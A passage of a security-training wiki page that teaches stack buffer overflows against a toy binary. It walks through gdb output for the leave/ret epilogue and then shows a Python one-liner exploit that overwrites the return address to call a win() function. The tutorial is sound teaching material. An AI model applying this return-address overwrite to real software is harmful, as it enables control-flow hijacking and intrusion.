    <span class="nv">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>

    <span class="nv">Breakpoint</span> <span class="mi">4</span>, <span class="mi">0</span><span class="nv">x080484da</span> <span class="nv">in</span> <span class="nv">vuln</span> <span class="ss">()</span>

    <span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">x</span><span class="o">/</span><span class="mi">4</span><span class="nv">wx</span> <span class="mi">0</span><span class="nv">xffffce00</span>
    <span class="mi">0</span><span class="nv">xffffce00</span>:     <span class="mi">0</span><span class="nv">x41414141</span>      <span class="mi">0</span><span class="nv">x41414141</span>      <span class="mi">0</span><span class="nv">x41414141</span>      <span class="mi">0</span><span class="nv">x41414141</span>
</pre></div>
</td></tr></tbody></table>
<p>let's talk about function epilogue .</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite" id="__code_10"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_10 pre, #__code_10 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="err">80484</span><span class="nl">da:</span>           <span class="nf">leave</span>
    <span class="err">80484</span><span class="nl">db:</span>           <span class="nf">ret</span>
</pre></div>
</td></tr></tbody></table>
<p>The leave instruction is actually </p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite" id="__code_11"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_11 pre, #__code_11 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="nf">mov</span> <span class="nb">esp</span> <span class="p">,</span> <span class="nb">ebp</span>
    <span class="nf">pop</span> <span class="nb">ebp</span>
</pre></div>
</td></tr></tbody></table>
<p>This will move the esp back to the position of the saved ebp thus 
destroying all the space allocated for the local variable , then pop 
instruction will move the saved ebp value back to ebp register , it 
basically deletes the stack frame created for vuln function and restores
 the stack frame of the main function before the controll is changed to 
main . The <code>ret</code> instruction will pop the value on top of the
 stack to the eip register thus changing the control back main ( on 
normal execution ).
</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="codehilite" id="__code_12"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_12 pre, #__code_12 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
    <span class="o">=&gt;</span> <span class="mi">0</span><span class="n">x80484da</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">leave</span>
    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
    <span class="err">$</span><span class="mi">6</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xffffce00</span>
    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">ebp</span>
    <span class="err">$</span><span class="mi">7</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xffffce18</span>
    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>

    <span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="n">x080484db</span> <span class="k">in</span> <span class="n">vuln</span> <span class="p">()</span>
    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>                             <span class="cm">/* stack frame of vuln function is destroyed */</span>
    <span class="err">$</span><span class="mi">8</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xffffce1c</span>
    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">ebp</span>
    <span class="err">$</span><span class="mi">9</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x41414141</span>
</pre></div>
</td></tr></tbody></table>
If we continue the program it will segfault since it will try to return 
to 0x41414141 ( AAAA ) which will be a invalid address , but if we give a
 valid address it will actually jump to that address when the function 
epilogue is executed<p></p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="codehilite" id="__code_13"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_13 pre, #__code_13 code"><span class="md-clipboard__message"></span></button><pre><span></span>    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
     <span class="o">=&gt;</span> <span class="mi">0</span><span class="n">x80484db</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">ret</span>
    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
    <span class="mi">0</span><span class="n">x41414141</span> <span class="k">in</span> <span class="o">??</span> <span class="p">()</span>
    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">eip</span>
    <span class="err">$</span><span class="mi">5</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x41414141</span>

    <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>

    <span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
    <span class="mi">0</span><span class="n">x41414141</span> <span class="k">in</span> <span class="o">??</span> <span class="p">()</span>
</pre></div>
</td></tr></tbody></table>
<p>The address of win function is <code>0804846b</code></p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite" id="__code_14"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_14 pre, #__code_14 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="o">(</span>gdb<span class="o">)</span> x/i win
   0x804848b &lt;win&gt;: push   ebp
</pre></div>
</td></tr></tbody></table>
<p>So let's write the exploit . We have to give 0x1c junk data ( to 
overflow the arr array ) and then the address of the win function so 
that the return address will be overwritten with the address of the <code>win()</code> , While giving the address as input we have to keep in mind that data is stored in <a href="https://en.wikipedia.org/wiki/Endianness#Little-endian">Little-endian</a><img name="kl_1567871715096" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12">
 thus we have to give the address in reverse order. We will be using 
python to generate our crafted input which triggers the bug and calls 
the win function .</p>
<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="codehilite" id="__code_15"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_15 pre, #__code_15 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="o">!</span> <span class="n">python</span> <span class="o">-</span><span class="k">c</span> <span class="s1">'print "A" * 0x1c + "\x8b\x84\x04\x08"'</span>  <span class="o">&gt;</span> <span class="k">input</span>       <span class="o">#</span> <span class="n">the</span> <span class="k">output</span> <span class="k">is</span> <span class="n">saved</span> <span class="k">to</span> <span class="n">file</span> <span class="n">inp</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="k">input</span>
<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="n">stack_example</span> <span class="o">&lt;</span> <span class="k">input</span>

<span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="n">x080484da</span> <span class="k">in</span> <span class="n">vuln</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">wx</span> <span class="err">$</span><span class="n">ebp</span><span class="o">+</span><span class="mi">0</span><span class="n">x4</span>
<span class="mi">0</span><span class="n">xffffce1c</span><span class="p">:</span>     <span class="mi">0</span><span class="n">x0804848b</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">i</span> <span class="mi">0</span><span class="n">x0804848b</span>
   <span class="mi">0</span><span class="n">x804848b</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">push</span>   <span class="n">ebp</span>
   <span class="mi">0</span><span class="n">x804848c</span> <span class="o">&lt;</span><span class="n">win</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">c</span>
<span class="n">Continuing</span><span class="p">.</span>
<span class="k">Input</span>  <span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAYou</span> <span class="n">Win</span> <span class="o">!</span> <span class="p">[</span><span class="n">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="n">process</span> <span class="mi">32330</span><span class="p">)</span> <span class="n">exited</span> <span class="n">normally</span><span class="p">]</span>
</pre></div>
</td></tr></tbody></table>
<p>Let's run it outside gdb .</p>
<div class="superfences-tabs">
<input name="__tabs_2" type="radio" id="__tab_2_0" checked="checked">
<label for="__tab_2_0">Bash</label>
<div class="superfences-content"><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_16"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_16 pre, #__code_16 code"><span class="md-clipboard__message"></span></button><pre><span></span>    python -c <span class="s1">'print "A" * 0x1c + "\x8b\x84\x04\x08"'</span> <span class="p">|</span> ./stack_example
</pre></div>
</td></tr></tbody></table></div>
<input name="__tabs_2" type="radio" id="__tab_2_1">
<label for="__tab_2_1">Output</label>
<div class="superfences-content"><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_17"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_17 pre, #__code_17 code"><span class="md-clipboard__message"></span></button><pre><span></span>    Input  : AAAAAAAAAAAAAAAAAAAAAAAAAAAYou Win !
</pre></div>
</td></tr></tbody></table></div>
</div>
<p>We have successfully changed the flow of the program . </p>
<details class="tip"><summary>Practice Challenges</summary><ul>
<li><a href="https://wiki.bi0s.in/pwning/stack-overflow/smash-the-stack/bof/cheating">cheating</a></li>
<li><a href="https://wiki.bi0s.in/pwning/stack-overflow/smash-the-stack/bof/bof">bof</a></li>
<li><a href="https://wiki.bi0s.in/pwning/stack-overflow/smash-the-stack/bof/e100">e100</a></li>
</ul>
</details>



</article>
</div>
</div>
</main>
<footer class="md-footer">
<div class="md-footer-nav">
<nav class="md-footer-nav__inner md-grid">
<a href="/help/bi0s_wiki/pwning/stack/intro/" title="Introduction to Stack" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
<div class="md-flex__cell md-flex__cell--shrink">
</div>
<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
<span class="md-flex__ellipsis">
<span class="md-footer-nav__direction">
Previous
</span>
Introduction to Stack
</span>
</div>
</a>
<a href="/help/bi0s_wiki/pwning/return2libc/return-to-libc/" title="ret2libc" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
<span class="md-flex__ellipsis">
<span class="md-footer-nav__direction">
Next
</span>
ret2libc
</span>
</div>
<div class="md-flex__cell md-flex__cell--shrink">
</div>
</a>
</nav>
</div>
{% endblock %}